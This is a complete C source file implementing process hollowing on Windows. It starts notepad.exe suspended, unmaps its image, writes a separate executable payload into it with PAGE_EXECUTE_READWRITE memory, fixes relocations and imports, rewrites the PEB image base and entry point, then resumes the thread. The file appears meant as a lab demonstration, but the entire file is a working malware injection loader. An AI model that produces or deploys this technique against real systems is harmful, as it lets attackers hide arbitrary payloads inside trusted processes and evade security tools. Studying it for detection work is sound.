#include <windows.h>
#include <stdio.h>

// ===== CONFIGURE THESE PATHS =====
#define TARGET_PROCESS "C:\\Windows\\System32\\notepad.exe"
#define PAYLOAD_EXE "C:\\Users\\bRootForce\\Desktop\\DummyPayloadEXE.exe"
// =================================

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);

BOOL ReadFileToMemory(const char* filepath, BYTE** buffer, DWORD* size) {
	HANDLE hFile = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to open payload file: %d\n", GetLastError());
		return FALSE;
	}

	*size = GetFileSize(hFile, NULL);
	*buffer = (BYTE*)malloc(*size);

	DWORD bytesRead;
	BOOL success = ReadFile(hFile, *buffer, *size, &bytesRead, NULL);
	CloseHandle(hFile);

	return success && bytesRead == *size;
}

BYTE* MapPEToMemory(BYTE* fileBuffer, PIMAGE_NT_HEADERS ntHeaders) {
	DWORD imageSize = ntHeaders->OptionalHeader.SizeOfImage;
	BYTE* mappedImage = (BYTE*)calloc(1, imageSize);

	if (!mappedImage) return NULL;

	// Copy headers
	memcpy(mappedImage, fileBuffer, ntHeaders->OptionalHeader.SizeOfHeaders);

	// Copy sections to their virtual addresses
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
	for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
		if (section[i].SizeOfRawData > 0) {
			memcpy(mappedImage + section[i].VirtualAddress,
				fileBuffer + section[i].PointerToRawData,
				section[i].SizeOfRawData);
		}
	}

	return mappedImage;
}

void ApplyRelocations(BYTE* baseAddress, ULONGLONG delta, PIMAGE_NT_HEADERS ntHeaders) {
	PIMAGE_DATA_DIRECTORY relocDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	if (relocDir->Size == 0) return;

	PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(baseAddress + relocDir->VirtualAddress);

	while (reloc->VirtualAddress != 0) {
		DWORD numEntries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
		WORD* relocData = (WORD*)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));

		for (DWORD i = 0; i < numEntries; i++) {
			int type = relocData[i] >> 12;
			int offset = relocData[i] & 0xFFF;

			if (type == IMAGE_REL_BASED_DIR64) {
				ULONGLONG* patchAddr = (ULONGLONG*)(baseAddress + reloc->VirtualAddress + offset);
				*patchAddr += delta;
			}
		}

		reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)reloc + reloc->SizeOfBlock);
	}
}

BOOL ResolveImports(BYTE* mappedBase, PIMAGE_NT_HEADERS ntHeaders) {
	if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size == 0) {
		return TRUE; // No imports
	}

	DWORD importRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
	PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(mappedBase + importRVA);

	while (importDesc->Name != 0) {
		char* dllName = (char*)(mappedBase + importDesc->Name);
		HMODULE hDll = LoadLibraryA(dllName);

		if (!hDll) {
			printf("[-] Failed to load DLL: %s\n", dllName);
			return FALSE;
		}

		PIMAGE_THUNK_DATA origThunk = NULL;
		if (importDesc->OriginalFirstThunk) {
			origThunk = (PIMAGE_THUNK_DATA)(mappedBase + importDesc->OriginalFirstThunk);
		}
		else {
			origThunk = (PIMAGE_THUNK_DATA)(mappedBase + importDesc->FirstThunk);
		}

		PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(mappedBase + importDesc->FirstThunk);

		while (origThunk->u1.AddressOfData != 0) {
			FARPROC funcAddr = NULL;

			if (IMAGE_SNAP_BY_ORDINAL(origThunk->u1.Ordinal)) {
				WORD ordinal = (WORD)IMAGE_ORDINAL(origThunk->u1.Ordinal);
				funcAddr = GetProcAddress(hDll, (LPCSTR)(ULONG_PTR)ordinal);
			}
			else {
				PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)(mappedBase + origThunk->u1.AddressOfData);
				funcAddr = GetProcAddress(hDll, (LPCSTR)importByName->Name);
			}

			if (!funcAddr) {
				printf("[-] Failed to resolve import\n");
				return FALSE;
			}

			thunk->u1.Function = (ULONGLONG)funcAddr;
			thunk++;
			origThunk++;
		}

		importDesc++;
	}

	return TRUE;
}

int main() {
	printf("==================================\n");
	printf("  Process Hollowing Method - EXE  \n");
	printf("==================================\n\n");
	printf("[+] Target: %s\n", TARGET_PROCESS);
	printf("[+] Payload: %s\n\n", PAYLOAD_EXE);

	// Step 1: Read and validate payload
	printf("[1] Reading payload...\n");
	BYTE* payloadBuffer = NULL;
	DWORD payloadSize = 0;

	if (!ReadFileToMemory(PAYLOAD_EXE, &payloadBuffer, &payloadSize)) {
		printf("[-] Failed to read payload\n");
		return 1;
	}

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payloadBuffer;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payloadBuffer + dosHeader->e_lfanew);

	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE || ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
		printf("[-] Invalid PE file\n");
		free(payloadBuffer);
		return 1;
	}

	// Step 2: Map PE to memory format
	printf("[2] Mapping PE to memory...\n");
	BYTE* mappedImage = MapPEToMemory(payloadBuffer, ntHeaders);
	if (!mappedImage) {
		printf("[-] Failed to map PE\n");
		free(payloadBuffer);
		return 1;
	}

	// Step 3: Create target process in suspended state
	printf("[3] Creating suspended process...\n");
	STARTUPINFOA si = { sizeof(si) };
	PROCESS_INFORMATION pi;

	if (!CreateProcessA(TARGET_PROCESS, NULL, NULL, NULL, FALSE,
		CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		printf("[-] Failed to create process: %d\n", GetLastError());
		free(mappedImage);
		free(payloadBuffer);
		return 1;
	}
	printf("    PID: %d\n", pi.dwProcessId);

	// Step 4: Get thread context and read PEB
	printf("[4] Getting process information...\n");
	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_FULL;
	GetThreadContext(pi.hThread, &ctx);

	PVOID pebAddress = (PVOID)(ctx.Rdx);
	PVOID imageBase;
	SIZE_T bytesRead;

	ReadProcessMemory(pi.hProcess, (PVOID)((LPBYTE)pebAddress + 0x10),
		&imageBase, sizeof(PVOID), &bytesRead);

	// Step 5: Unmap original executable
	printf("[5] Unmapping original image...\n");
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	pNtUnmapViewOfSection NtUnmapViewOfSection =
		(pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");

	if (NtUnmapViewOfSection(pi.hProcess, imageBase) != 0) {
		printf("[-] Failed to unmap\n");
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		free(mappedImage);
		free(payloadBuffer);
		return 1;
	}

	// Step 6: Allocate memory for payload
	printf("[6] Allocating memory...\n");
	PVOID newImageBase = VirtualAllocEx(pi.hProcess,
		(PVOID)ntHeaders->OptionalHeader.ImageBase,
		ntHeaders->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (!newImageBase) {
		newImageBase = VirtualAllocEx(pi.hProcess, NULL,
			ntHeaders->OptionalHeader.SizeOfImage,
			MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	}

	if (!newImageBase) {
		printf("[-] Failed to allocate memory\n");
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		free(mappedImage);
		free(payloadBuffer);
		return 1;
	}
	printf("    Allocated at: 0x%p\n", newImageBase);

	// Step 7: Apply relocations if needed
	printf("[7] Applying relocations...\n");
	ULONGLONG delta = (ULONGLONG)newImageBase - ntHeaders->OptionalHeader.ImageBase;
	if (delta != 0) {
		ApplyRelocations(mappedImage, delta, ntHeaders);
	}

	// Step 8: Resolve imports
	printf("[8] Resolving imports...\n");
	if (!ResolveImports(mappedImage, ntHeaders)) {
		printf("[-] Import resolution failed\n");
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		free(mappedImage);
		free(payloadBuffer);
		return 1;
	}

	// Step 9: Write payload to target process
	printf("[9] Writing payload to process...\n");
	if (!WriteProcessMemory(pi.hProcess, newImageBase, mappedImage,
		ntHeaders->OptionalHeader.SizeOfImage, NULL)) {
		printf("[-] Failed to write memory\n");
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		free(mappedImage);
		free(payloadBuffer);
		return 1;
	}

	// Step 10: Update PEB with new image base
	printf("[10] Updating PEB...\n");
	WriteProcessMemory(pi.hProcess, (PVOID)((LPBYTE)pebAddress + 0x10),
		&newImageBase, sizeof(PVOID), NULL);

	// Step 11: Set entry point
	printf("[11] Setting entry point...\n");
	ctx.Rip = (DWORD64)((LPBYTE)newImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
	SetThreadContext(pi.hThread, &ctx);

	// Step 12: Resume execution
	printf("[12] Resuming thread...\n");
	ResumeThread(pi.hThread);

	printf("\n[+] Process hollowing complete!\n");
	printf("[+] Payload should now execute in PID %d\n", pi.dwProcessId);
	printf("[+] Use Process Explorer/Hacker to inspect the hollowed process\n");

	// Cleanup
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	free(mappedImage);
	free(payloadBuffer);

	return 0;
}